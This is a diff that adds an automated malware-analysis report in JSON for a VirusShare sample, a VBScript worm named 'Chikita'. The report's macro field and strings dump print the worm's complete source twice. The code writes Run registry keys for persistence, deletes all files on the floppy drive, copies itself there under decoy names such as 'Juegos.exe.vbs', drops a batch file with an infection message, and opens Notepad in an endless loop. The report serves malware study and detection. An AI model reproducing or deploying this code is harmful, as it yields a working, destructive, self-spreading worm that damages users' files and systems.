@@ -1,0 +1,71 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nSet File = CreateObject(\"scripting.filesystemobject\")\nSet regedit = CreateObject(\"WScript.Shell\")\nSet Sys = File.GetSpecialFolder(1)\n\nSet reg = regedit.regwrite(\"HKLM\\Software\\Microsoft\\Windows\\Run\\Chikita\", Sys & \"\\Chikita.vbs\")\nSet reg = regedit.regwrite(\"HKLM\\Software\\Microsoft\\Windows\\Run\\WinLinux\", \"C:\\Chikita.bat\")\nSet reg = regedit.regwrite(\"HKLM\\Software\\Microsoft\\MessengerService\\Policies\\IMWarning\",\"Messenger crackeado por (F) Chikita (F)\")\n\nRandomize\nNum = Int((Rnd * 4) + 1)\nIf Num = 1 Then Nombre = \"Juegos.exe\"\nIf Num = 2 Then Nombre = \"Chistes.doc\"\nIf Num = 3 Then Nombre = \"Videos.avi\"\nIf Num = 4 Then Nombre = \"Chikita.jpg\"\n\nFile.DeleteFile(\"A:\\*.*\")\nFile.CopyFile wscript.scriptFullName, \"A:\\\" & Nombre & \".vbs\"\nFile.CopyFile wscript.scriptFullName, Sys & \"\\Chikita.vbs\"\n\nSet Bat = File.CreateTextFile(\"C:\\Chikita.bat\", True)\nBat.WriteLine(\"@echo off\")\nBat.WriteLine(\"echo.Lo siento mucho pero estas infectado con el virus Chikita\")\nBat.WriteLine(\"echo.Este virus no destruye ningun tipo de archivo ni formatea el PC\")\nBat.WriteLine(\"echo.\")\nBat.WriteLine(\"echo.Este virus solo ha sido creado con el unico fin de expandirse\")\nBat.WriteLine(\"echo.Si tienes algun diskete en el PC, el virus se abra copiado en el.\")\nBat.WriteLine(\"echo.\")\nBat.WriteLine(\"pause\")\nBat.WriteLine(\"cls\")\nBat.WriteLine(\"echo.Gracias por tu colaboracion. Adios\")\nBat.WriteLine(\"echo.\")\nBat.WriteLine(\"echo.Un besito, de parte de Chikita\")\nBat.Close\n\nDo\n Regedit.Run \"%windir%\\Notepad.exe\"\nLoop"
+    },
+    "filename": "VirusShare_283e7c7f9b5013298dc8b9e7d743a4da",
+    "filesize": 1548,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "283e7c7f9b5013298dc8b9e7d743a4da",
+        "sha1": "9f04442164d0edd0dd6611f9a0d0523c9480796f",
+        "sha256": "cba07aed5f90d8ce715dc4b6fcd8b7a9d3697e6fead902d590273aa9849b979e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Set File = CreateObject(\"scripting.filesystemobject\")",
+            "Set regedit = CreateObject(\"WScript.Shell\")",
+            "Set Sys = File.GetSpecialFolder(1)",
+            "Set reg = regedit.regwrite(\"HKLM\\Software\\Microsoft\\Windows\\Run\\Chikita\", Sys & \"\\Chikita.vbs\")",
+            "Set reg = regedit.regwrite(\"HKLM\\Software\\Microsoft\\Windows\\Run\\WinLinux\", \"C:\\Chikita.bat\")",
+            "Set reg = regedit.regwrite(\"HKLM\\Software\\Microsoft\\MessengerService\\Policies\\IMWarning\",\"Messenger crackeado por (F) Chikita (F)\")",
+            "Randomize",
+            "Num = Int((Rnd * 4) + 1)",
+            "If Num = 1 Then Nombre = \"Juegos.exe\"",
+            "If Num = 2 Then Nombre = \"Chistes.doc\"",
+            "If Num = 3 Then Nombre = \"Videos.avi\"",
+            "If Num = 4 Then Nombre = \"Chikita.jpg\"",
+            "File.DeleteFile(\"A:\\*.*\")",
+            "File.CopyFile wscript.scriptFullName, \"A:\\\" & Nombre & \".vbs\"",
+            "File.CopyFile wscript.scriptFullName, Sys & \"\\Chikita.vbs\"",
+            "Set Bat = File.CreateTextFile(\"C:\\Chikita.bat\", True)",
+            "Bat.WriteLine(\"@echo off\")",
+            "Bat.WriteLine(\"echo.Lo siento mucho pero estas infectado con el virus Chikita\")",
+            "Bat.WriteLine(\"echo.Este virus no destruye ningun tipo de archivo ni formatea el PC\")",
+            "Bat.WriteLine(\"echo.\")",
+            "Bat.WriteLine(\"echo.Este virus solo ha sido creado con el unico fin de expandirse\")",
+            "Bat.WriteLine(\"echo.Si tienes algun diskete en el PC, el virus se abra copiado en el.\")",
+            "Bat.WriteLine(\"echo.\")",
+            "Bat.WriteLine(\"pause\")",
+            "Bat.WriteLine(\"cls\")",
+            "Bat.WriteLine(\"echo.Gracias por tu colaboracion. Adios\")",
+            "Bat.WriteLine(\"echo.\")",
+            "Bat.WriteLine(\"echo.Un besito, de parte de Chikita\")",
+            "Bat.Close",
+            " Regedit.Run \"%windir%\\Notepad.exe\"",
+            "Loop"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.278803",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
